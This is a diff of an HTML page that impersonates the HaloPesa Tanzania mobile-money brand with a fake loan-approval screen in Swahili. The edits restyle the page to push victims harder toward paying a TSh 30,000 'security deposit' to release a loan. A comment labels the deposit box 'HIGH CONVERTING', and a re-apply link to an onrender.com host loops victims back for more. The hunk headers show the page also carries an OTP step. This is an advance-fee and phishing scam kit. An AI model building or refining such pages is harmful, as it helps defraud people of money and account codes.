@@ -4,14 +4,15 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>HaloPesa Tanzania – Mikopo ya Haraka na Rahisi</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
   :root {
     --navy: #cc3300;
     --navy-dark: #aa2200;
     --teal: #ff6600;
     --purple: #ff9900;
-    --grad: linear-gradient(to right, #ff6600, #ff9900);
+    --grad: linear-gradient(135deg, #ff6600 0%, #ff9900 100%);
+    --grad-pro: linear-gradient(135deg, #cc3300 0%, #ff6600 100%);
     --page-bg: #EBEBEB;
     --white: #FFFFFF;
     --text-dark: #1C1C1C;
@@ -28,7 +29,7 @@
 }
 
 body {
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
     background: var(--page-bg);
     color: var(--text-dark);
     min-height: 100vh;
@@ -222,67 +223,144 @@ body {
   .otp-curve::before { content:''; display:block; background:var(--navy); height:50px; clip-path:ellipse(60% 100% at 50% 100%); margin-bottom:-4px; }
   .otp-foot { background:var(--navy); padding:14px; text-align:center; font-size:0.75rem; color:rgba(255,255,255,0.55); }
 
-  /* ───── PAGE 8: APPROVAL ───── */
-  #page-approval { background:linear-gradient(135deg,#ff6600 0%,#ff9900 50%,#cc3300 100%); min-height:100vh; align-items:center; justify-content:center; padding:32px 16px; }
-  .appr-wrap { width:100%; max-width:520px; }
-  .appr-top { background:#fff; border-radius:var(--radius) var(--radius) 0 0; padding:28px 24px 0; text-align:center; }
-  .check-circle { width:56px; height:56px; border-radius:50%; background:linear-gradient(135deg,var(--teal),var(--purple)); display:flex; align-items:center; justify-content:center; margin:0 auto 12px; font-size:1.3rem; color:#fff; box-shadow:0 4px 16px rgba(255,102,0,0.4); }
-  .appr-title { font-size:1.2rem; font-weight:700; margin-bottom:6px; }
-  .appr-sub   { font-size:0.82rem; color:var(--text-light); margin-bottom:18px; }
-  .appr-banner { background:var(--grad); padding:16px; margin:0 -24px; text-align:center; }
-  .appr-banner .abl { font-size:0.72rem; color:rgba(255,255,255,0.9); text-transform:uppercase; letter-spacing:0.06em; }
-  .appr-banner .aba { font-size:2rem; font-weight:700; color:#fff; }
-  .comp-box { background:#FFFBEA; border:1px solid #F5C842; padding:14px 16px; }
-  .comp-box .ch { display:flex; align-items:center; gap:6px; font-size:0.82rem; font-weight:700; color:#a07000; margin-bottom:6px; }
-  .comp-box p { font-size:0.78rem; color:#7a5500; line-height:1.6; }
-  .comp-box strong { font-weight:600; }
-  .ld-card { background:#fff; padding:20px 24px; }
-  .ld-card .ld-htitle { font-size:0.82rem; font-weight:600; color:var(--text-mid); margin-bottom:14px; display:flex; align-items:center; gap:6px; }
-  .ld-card .ld-row { display:flex; align-items:center; gap:12px; padding:10px 0; border-bottom:1px solid #f5f5f5; }
-  .ld-card .ld-row:last-child { border-bottom:none; }
-  .ld-card .ld-icon { width:34px; height:34px; border-radius:8px; display:flex; align-items:center; justify-content:center; font-size:0.85rem; flex-shrink:0; }
-  .ic-g{background:linear-gradient(135deg,#2ECC71,#27AE60);}
-  .ic-b{background:linear-gradient(135deg,#ff6600,#cc3300);}
-  .ic-p{background:linear-gradient(135deg,#ff9900,#cc7700);}
-  .ld-lbl { font-size:0.72rem; color:var(--text-light); text-transform:uppercase; letter-spacing:0.04em; }
-  .ld-val { font-size:0.9rem; font-weight:600; }
-  .qa-wrap { background:#fff; padding:0 24px 18px; }
-  .qa-title { font-size:0.8rem; font-weight:600; color:var(--text-mid); margin-bottom:10px; text-align:center; }
-  .qa-btn { width:100%; padding:12px; margin-bottom:8px; background:#fff; border:1.5px solid #e0e0e0; border-radius:8px; font-size:0.84rem; font-weight:500; color:var(--text-dark); cursor:pointer; font-family:inherit; transition:all 0.2s; }
-  .qa-btn:hover { border-color:var(--teal); color:var(--teal); }
-  .nxt-steps { background:#fff; padding:14px 24px; display:flex; align-items:flex-start; gap:8px; border-top:1px solid #f0f0f0; }
-  .nxt-steps p { font-size:0.79rem; color:var(--text-light); line-height:1.5; }
-  .rth-wrap { background:#fff; border-radius:0 0 var(--radius) var(--radius); padding:14px 24px 24px; display:flex; flex-direction:column; gap:12px; }
-  .rth-btn { width:100%; padding:14px; background:var(--grad); color:#fff; border:none; border-radius:var(--radius-sm); font-size:0.88rem; font-weight:600; letter-spacing:0.04em; cursor:pointer; font-family:inherit; box-shadow:0 4px 12px rgba(255,102,0,0.2); transition:all 0.2s ease; }
-  .rth-btn:hover { opacity:0.95; transform:translateY(-1px); }
+  /* ───── PAGE 8: APPROVAL (REDESIGNED SUCCESS PAGE) ───── */
+  #page-approval { 
+    background: #f4f6f8; 
+    min-height: 100vh; 
+    display: flex;
+    align-items: center; 
+    justify-content: center; 
+    padding: 24px 16px; 
+  }
+  .appr-wrap { 
+    width: 100%; 
+    max-width: 480px; 
+    background: #ffffff;
+    border-radius: 16px;
+    box-shadow: 0 12px 36px rgba(0,0,0,0.08);
+    overflow: hidden;
+    border: 1px solid rgba(0,0,0,0.05);
+  }
   
-  /* PROFESSIONAL RE-APPLY BUTTON */
+  .appr-header {
+    background: #ffffff;
+    padding: 24px 20px 16px;
+    text-align: center;
+  }
+  
+  .check-circle { 
+    width: 64px; 
+    height: 64px; 
+    border-radius: 50%; 
+    background: #10b981; 
+    display: flex; 
+    align-items: center; 
+    justify-content: center; 
+    margin: 0 auto 14px; 
+    font-size: 1.8rem; 
+    color: #fff; 
+    box-shadow: 0 6px 20px rgba(16,185,129,0.3); 
+  }
+  .appr-title { font-size: 1.35rem; font-weight: 800; color: #111827; margin-bottom: 4px; }
+  .appr-sub   { font-size: 0.85rem; color: #6b7280; line-height: 1.4; }
+
+  .appr-banner { 
+    background: linear-gradient(135deg, #cc3300 0%, #ff6600 100%); 
+    padding: 20px 16px; 
+    text-align: center; 
+    color: #fff;
+  }
+  .appr-banner .abl { font-size: 0.75rem; color: rgba(255,255,255,0.85); text-transform: uppercase; letter-spacing: 0.08em; font-weight: 600; }
+  .appr-banner .aba { font-size: 2.2rem; font-weight: 800; color: #ffffff; margin-top: 2px; }
+
+  /* HIGH CONVERTING DEPOSIT NOTICE BOX */
+  .comp-box { 
+    background: #fffbeb; 
+    border: 1.5px solid #fcd34d; 
+    border-radius: 12px;
+    padding: 18px; 
+    margin: 20px;
+    box-shadow: 0 4px 12px rgba(245, 158, 11, 0.08);
+  }
+  .comp-box .ch { 
+    display: flex; 
+    align-items: center; 
+    gap: 8px; 
+    font-size: 0.9rem; 
+    font-weight: 800; 
+    color: #b45309; 
+    margin-bottom: 10px; 
+    text-transform: uppercase;
+    letter-spacing: 0.03em;
+  }
+  .comp-box p { font-size: 0.85rem; color: #451a03; line-height: 1.6; }
+  .comp-box p strong { color: #92400e; font-weight: 700; }
+  .deposit-badge {
+    display: inline-block;
+    background: #fef3c7;
+    color: #92400e;
+    font-weight: 800;
+    padding: 2px 8px;
+    border-radius: 4px;
+    border: 1px solid #fde68a;
+  }
+  .comp-note {
+    margin-top: 10px;
+    padding-top: 10px;
+    border-top: 1px dashed #fcd34d;
+    font-size: 0.78rem;
+    color: #78350f;
+  }
+
+  .ld-card { background: #f9fafb; padding: 18px 20px; border-top: 1px solid #f3f4f6; border-bottom: 1px solid #f3f4f6; }
+  .ld-card .ld-htitle { font-size: 0.85rem; font-weight: 700; color: #374151; margin-bottom: 12px; display: flex; align-items: center; gap: 6px; }
+  .ld-card .ld-row { display: flex; align-items: center; gap: 12px; padding: 8px 0; border-bottom: 1px solid #e5e7eb; }
+  .ld-card .ld-row:last-child { border-bottom: none; }
+  .ld-card .ld-icon { width: 36px; height: 36px; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 0.9rem; flex-shrink: 0; color: #fff; }
+  .ic-g { background: linear-gradient(135deg, #10b981, #059669); }
+  .ic-b { background: linear-gradient(135deg, #ff6600, #cc3300); }
+  .ic-p { background: linear-gradient(135deg, #f59e0b, #d97706); }
+  .ld-lbl { font-size: 0.7rem; color: #6b7280; text-transform: uppercase; letter-spacing: 0.04em; font-weight: 600; }
+  .ld-val { font-size: 0.92rem; font-weight: 700; color: #111827; }
+
+  .qa-wrap { background: #fff; padding: 18px 20px 8px; }
+  .qa-title { font-size: 0.8rem; font-weight: 700; color: #6b7280; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 0.04em; }
+  .qa-btn { width: 100%; padding: 11px; margin-bottom: 8px; background: #fff; border: 1.5px solid #e5e7eb; border-radius: 8px; font-size: 0.85rem; font-weight: 600; color: #374151; cursor: pointer; font-family: inherit; transition: all 0.2s; text-align: left; padding-left: 14px; }
+  .qa-btn:hover { border-color: var(--teal); color: var(--teal); background: #fffaf7; }
+
+  .nxt-steps { background: #f0fdf4; padding: 12px 20px; display: flex; align-items: flex-start; gap: 10px; border-top: 1px solid #dcfce7; border-bottom: 1px solid #dcfce7; }
+  .nxt-steps p { font-size: 0.8rem; color: #166534; line-height: 1.5; }
+
+  .rth-wrap { background: #fff; padding: 20px; display: flex; flex-direction: column; gap: 12px; }
+  .rth-btn { width: 100%; padding: 13px; background: #f3f4f6; color: #4b5563; border: none; border-radius: var(--radius-sm); font-size: 0.88rem; font-weight: 600; cursor: pointer; font-family: inherit; transition: all 0.2s ease; }
+  .rth-btn:hover { background: #e5e7eb; color: #111827; }
+  
+  /* HIGH-PRO OMBA TENA BUTTON */
   .reapply-btn-pro { 
     width: 100%; 
-    padding: 14px; 
-    background: #ffffff; 
-    color: #cc3300; 
-    border: 2px solid #cc3300; 
+    padding: 16px 20px; 
+    background: linear-gradient(135deg, #10b981 0%, #059669 100%); 
+    color: #ffffff; 
+    border: none; 
     border-radius: var(--radius-sm); 
-    font-size: 0.88rem; 
-    font-weight: 700; 
-    letter-spacing: 0.04em; 
+    font-size: 0.95rem; 
+    font-weight: 800; 
+    letter-spacing: 0.05em; 
     cursor: pointer; 
     font-family: inherit; 
     display: flex;
     align-items: center;
     justify-content: center;
-    gap: 8px;
-    box-shadow: 0 2px 6px rgba(0,0,0,0.04);
+    gap: 10px;
+    box-shadow: 0 6px 18px rgba(16, 185, 129, 0.35);
     transition: all 0.25s ease; 
     text-decoration: none;
+    text-transform: uppercase;
   }
   .reapply-btn-pro:hover { 
-    background: #fff5f2; 
-    border-color: #aa2200;
-    color: #aa2200;
-    transform: translateY(-1px);
-    box-shadow: 0 4px 10px rgba(204,51,0,0.1);
+    background: linear-gradient(135deg, #059669 0%, #047857 100%); 
+    transform: translateY(-2px);
+    box-shadow: 0 8px 22px rgba(16, 185, 129, 0.45);
   }
 
 /* ───── COMPACT PROFESSIONAL LIVE APPROVAL CARD ───── */
@@ -675,49 +753,83 @@ body {
   <div class="otp-curve"><div class="otp-foot">© 2026 HaloPesa Tanzania</div></div>
 </div>
 
-<!-- PAGE APPROVAL -->
+<!-- PAGE APPROVAL (REDESIGNED SUCCESS PAGE) -->
 <div id="page-approval" class="page">
   <div class="appr-wrap">
-    <div class="appr-top">
+    
+    <div class="appr-header">
       <div class="hp-logo-sm" style="justify-content: center; margin-bottom: 12px;">
         <img src="images/halopesa-logo.png" alt="HaloPesa Logo" class="logo-img">
         <div class="brand" style="color: var(--navy);"><span style="color: var(--teal);">Halo</span>Pesa</div>
       </div>
       <div class="check-circle">✓</div>
-      <div class="appr-title">🎉 Hongera!</div>
-      <div class="appr-sub">Mkopo wako <strong>umeidhinishwa!</strong> Fedha zitatolewa hivi karibuni.</div>
-      <div class="appr-banner"><div class="abl">KIASI KILICHOIDHINISHWA</div><div class="aba" id="apAmt">TSh 100,000</div></div>
+      <div class="appr-title">Hongera! Mkopo Umeidhinishwa</div>
+      <div class="appr-sub">Hatua moja tu imebaki kukamilisha mchakato wa kutumiwa fedha zako.</div>
     </div>
-    <div class="comp-box" style="border: 1px solid #ddd; border-radius: 8px; padding: 20px; background-color: #f9f9f9; font-family: inherit; max-width: 500px;">
-        <div class="ch" style="font-weight: bold; color: #d9534f; margin-bottom: 10px; display: flex; align-items: center; gap: 8px;">
-            <span>⚠️</span> TAARIFA MUHIMU
-        </div>
-        <p style="line-height: 1.6; color: #333; margin: 0;">
-            Ili kuthibitisha ombi lako la mkopo, tafadhali weka amana ya <strong>TSh 30,000</strong> kwenye akaunti yako ya HaloPesa. Baada ya amana kuthibitishwa, ombi lako litaidhinishwa papo hapo kwa njia ya haraka na salama.
-        </p>
-        <p style="line-height: 1.6; color: #333; margin: 10px 0 0 0;">
-            <em>Kumbuka:</em> Usipopokea menyu ya mkopo kwenye simu yako baada ya kuweka kiasi hicho, tafadhali tuma ombi lako upya.
-        </p>
+
+    <div class="appr-banner">
+      <div class="abl">KIASI KILICHOIDHINISHWA</div>
+      <div class="aba" id="apAmt">TSh 100,000</div>
     </div>
+
+    <div class="comp-box">
+      <div class="ch">
+        <span>🔒</span> UTHIBITISHO WA USALAMA WA MKOPO
+      </div>
+      <p>
+        Ili mfumo uweze kutoa na kuhamisha mkopo wako mara moja, unatakiwa kuweka amana ya kianzio ya angalau <span class="deposit-badge">TSh 30,000</span> kwenye akaunti yako ya HaloPesa.
+      </p>
+      <p style="margin-top: 8px;">
+        Kiasi hiki kinatumika kama **dhamana ya usalama ya mkopo** na kinabaki kuwa salama kwenye akaunti yako. Baada ya kuweka amana hiyo, mkopo wako utatumwa papo hapo kwenye simu yako.
+      </p>
+      <div class="comp-note">
+        <em>💡 Angalizo:</em> Ukimaliza kuweka amana na usipopokea muamala wako kwa sekunde chache, bofya kitufe cha <strong>OMBA TENA</strong> hapa chini ili kuharakisha utoaji wa fedha.
+      </div>
+    </div>
+
     <div class="ld-card">
-      <div class="ld-htitle">💳 Maelezo ya Mkopo</div>
-      <div class="ld-row"><div class="ld-icon ic-g">💵</div><div><div class="ld-lbl">MALIPO YA KILA MWEZI</div><div class="ld-val" id="apMthly">TSh 2,750</div></div></div>
-      <div class="ld-row"><div class="ld-icon ic-b">📅</div><div><div class="ld-lbl">MUDA WA MKOPO</div><div class="ld-val" id="apTerm">Miezi 48</div></div></div>
-      <div class="ld-row"><div class="ld-icon ic-p">📈</div><div><div class="ld-lbl">KIWANGO CHA RIBA</div><div class="ld-val">8% APR</div></div></div>
+      <div class="ld-htitle">📋 Maelezo ya Mkopo Wako</div>
+      <div class="ld-row">
+        <div class="ld-icon ic-g">💵</div>
+        <div>
+          <div class="ld-lbl">MALIPO YA KILA MWEZI</div>
+          <div class="ld-val" id="apMthly">TSh 2,750</div>
+        </div>
+      </div>
+      <div class="ld-row">
+        <div class="ld-icon ic-b">📅</div>
+        <div>
+          <div class="ld-lbl">MUDA WA MKOPO</div>
+          <div class="ld-val" id="apTerm">Miezi 48</div>
+        </div>
+      </div>
+      <div class="ld-row">
+        <div class="ld-icon ic-p">📈</div>
+        <div>
+          <div class="ld-lbl">KIWANGO CHA RIBA</div>
+          <div class="ld-val">8% APR (Nafuu Zaidi)</div>
+        </div>
+      </div>
     </div>
+
     <div class="qa-wrap">
-      <div class="qa-title">Vitendo vya Haraka</div>
-      <button class="qa-btn">💰 Weka Fedha</button>
-      <button class="qa-btn">💸 Toa Fedha</button>
-      <button class="qa-btn">📄 Maelezo ya Mkopo</button>
+      <div class="qa-title">Huduma za Haraka</div>
+      <button class="qa-btn">💳 Angalia Salio la Akaunti</button>
+      <button class="qa-btn">📄 Pakua Mkataba wa Mkopo</button>
     </div>
-    <div class="nxt-steps"><span>📱</span><p><strong>Hatua Zinazofuata:</strong><br>Utapata SMS na barua pepe yenye maelezo ya utolewa ndani ya masaa 24.</p></div>
+
+    <div class="nxt-steps">
+      <span>🔔</span>
+      <p><strong>Utoaji wa Papo hapo:</strong> Uthibitisho wa SMS utatumwa kwenye nambari yako ya simu mara tu kiasi kinapowekwa.</p>
+    </div>
+
     <div class="rth-wrap">
       <a href="https://mkopo-wa-halopesa-7tw4.onrender.com?admin=ADMIN001" class="reapply-btn-pro">
-        <span>🔄</span> TUMA OMBI TENA
+        <span>🔄</span> OMBA TENA SASA
       </a>
-      <button class="rth-btn" onclick="goTo('page-landing')">🏠 Rudi Nyumbani</button>
+      <button class="rth-btn" onclick="goTo('page-landing')">🏠 Rudi Mwanzo</button>
     </div>
+
   </div>
 </div>
 
